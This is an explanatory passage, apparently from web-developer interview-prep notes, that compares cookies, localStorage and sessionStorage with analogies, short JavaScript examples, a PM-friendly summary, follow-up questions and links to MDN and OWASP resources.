<summary><strong>💬 Explain to Junior: Cookies vs Storage Simplified</strong></summary>

**Simple Analogy:**

```javascript
// Cookie = Sticky note on your forehead
// - Everyone can see it (server sees it on every request)
// - Small space (4KB)
// - Can set expiration ("throw away after 1 hour")
// - But: Adds overhead (you carry it everywhere)

document.cookie = "name=Alice";
// Now sent with EVERY request to this site

// localStorage = Notebook in your pocket
// - Only YOU can see it (server never sees it)
// - Bigger space (10MB)
// - Stays forever (until you erase it)
// - No overhead (not sent with requests)

localStorage.setItem('name', 'Alice');
// Stays in browser, NOT sent to server
```

**When to Use Each:**

```javascript
// Use Cookie when:
// 1. Server needs the data
document.cookie = "sessionId=abc123"; // Server checks this

// 2. Need automatic expiration
document.cookie = "temp=value; max-age=3600"; // Gone in 1 hour

// 3. Security is critical (HttpOnly)
// (Set by server):
res.cookie('authToken', token, { httpOnly: true }); // JS can't access!

// Use localStorage when:
// 1. Only client needs it
localStorage.setItem('theme', 'dark'); // Server doesn't care

// 2. Need lots of space
const bigData = { /* 1MB of data */ };
localStorage.setItem('cache', JSON.stringify(bigData)); // Can't fit in cookie!

// 3. Want it to persist
localStorage.setItem('favorites', favorites); // Stays forever

// Use sessionStorage when:
// 1. Temporary, tab-specific
sessionStorage.setItem('formDraft', draft); // Gone when tab closes

// 2. Don't want it shared across tabs
// Each tab has its own sessionStorage
```

**Explaining to PM:**

"Cookies and web storage are different tools for different jobs:

**Cookies (Sticky Notes):**
- Server can read them
- Small (4KB max)
- Sent with every request
- Good for: Login sessions, tracking
- Bad for: Large data (slows requests)

**localStorage (Notebook):**
- Server can't read it
- Large (10MB)
- Never sent to server
- Good for: User settings, cached data
- Bad for: Sensitive data (can be stolen by XSS)

**Business Impact:**
- Wrong: Auth token in localStorage → Hackable
- Right: Auth token in HttpOnly cookie → Secure
- Example: Twitter uses HttpOnly cookies for security
- Example: Your theme preference in localStorage (no server needed)"

</details>

### Follow-up Questions

- "What are the security flags for cookies?"
- "How do you implement cookie-based authentication?"
- "What is the SameSite cookie attribute?"
- "When would you use IndexedDB instead of localStorage?"
- "How do you handle cookie consent (GDPR)?"

### Resources

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN: Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
- [Web.dev: SameSite Cookies](https://web.dev/samesite-cookies-explained/)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---
